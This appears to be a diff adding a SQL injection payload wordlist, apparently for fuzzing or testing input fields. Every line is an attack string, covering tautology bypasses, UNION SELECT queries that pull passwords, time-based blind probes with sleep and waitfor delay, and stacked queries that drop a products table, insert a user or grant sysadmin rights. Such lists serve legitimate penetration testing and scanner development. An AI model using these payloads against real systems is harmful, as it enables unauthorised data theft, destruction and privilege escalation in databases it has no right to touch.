@@ -1,0 +1,50 @@
+123 OR 1=1
+AND 1
+AND 0
+AND true
+AND false
+"-1 UNION SELECT 1 INTO @,@"
+"-1 UNION SELECT 1 INTO @,@,@"
+1 AND (SELECT * FROM Users) = 1
+1 or pg_sleep(5)--
+"1 or benchmark(10000000,MD5(1))#"
+1 or 1=1--
+1 or 1=1
+2 and 456=678
+2 or 345=345
+2 order by 9999
+2 order by 1
+2/0 and 456=678
+2/1 or 345=345
+2/*f*/and/*f*/456=678
+2/*f*/or/*f*/345=345
+1 or sleep(5)
+1 union (select @@version) --
+1 and 1=(select count(*) from tablenames); --
+1 GROUP BY columnnames having 1=1 --
+1 UNION SELECT * from users where name = 'admin'
+"1;  insert into user (user, host, password) values ('name', 'localhost', password('pass123')) --"
+1 UNION SELECT password FROM users
+1; DROP TABLE products
+1 OR 1=1
+1 OR 1=0
+1 OR x=x
+1 OR x=y
+1 HAVING 1=1
+1 HAVING 1=1#
+1 HAVING 1=1-- 
+"1234 AND 1= 0 UNION ALL SELECT ""admin"""
+"1 and (select substring(@@version,1,1))='X'"
+1; waitfor delay '0:0:5'--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+1 or SLEEP(5)
+"1 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#"
+"1; exec sp_addsrvrolemember 'name' , 'sysadmin' --"
+1; declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 
+1; execute immediate 'sel' || 'ect us' || 'er'
+"1 ORDER BY 1,2--+"
+"1 ORDER BY 1,2,3--+"
+"1 GROUP BY 1,2,--+"
+"1 GROUP BY 1,2,3--+"
+ 1 and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+1 or username like '%
